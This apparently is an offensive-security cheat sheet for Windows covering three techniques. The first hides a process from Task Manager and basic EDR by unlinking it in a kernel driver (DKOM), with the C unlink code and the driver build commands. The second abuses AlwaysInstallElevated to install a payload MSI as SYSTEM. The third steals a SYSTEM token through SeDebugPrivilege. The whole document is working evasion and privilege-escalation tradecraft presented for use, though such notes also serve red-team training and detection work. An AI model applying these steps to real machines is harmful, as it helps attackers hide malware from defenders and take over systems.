# Windows

DKOM process hiding (kernel driver) — walk `_EPROCESS.ActiveProcessLinks` for the target process and unlink it from the list so tools that enumerate processes via the official list don't see it. Offsets are build-specific (check with WinDbg `dt nt!_eprocess`).

```c
// unlink the entry, then self-link it so the list stays consistent
listEntry->Blink->Flink = listEntry->Flink;
listEntry->Flink->Blink = listEntry->Blink;
listEntry->Flink = listEntry; listEntry->Blink = listEntry;
```

```bash
# x64 Native Tools Command Prompt
cl.exe /D_AMD64_ /I"<km-include-path>" /c hide.c
link.exe /DRIVER /RELEASE /SUBSYSTEM:NATIVE /ENTRY:DriverEntry hide.obj ntoskrnl.lib /LIBPATH:"<km-lib-path>" /OUT:out.sys
```

Only hides from tools walking the live process list (Task Manager, basic EDR) — doesn't survive memory forensics or kernel callback-based detection.

AlwaysInstallElevated — if both policy keys are set to 1, any MSI installs with SYSTEM rights regardless of who runs it:

```powershell
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# package a payload exe into an MSI (e.g. Visual Studio Installer Projects), run it
```

SeDebugPrivilege abuse — if your token holds it (common on an "administrator" PowerShell even without full admin), open a handle to a SYSTEM process and steal/duplicate its token:

```powershell
# list processes, pick a SYSTEM-owned one (spoolsv.exe, etc.)
SeDebugPrivesc.exe <pid> <payload.exe>   # tool opens the process, duplicates the token, runs payload as SYSTEM
```
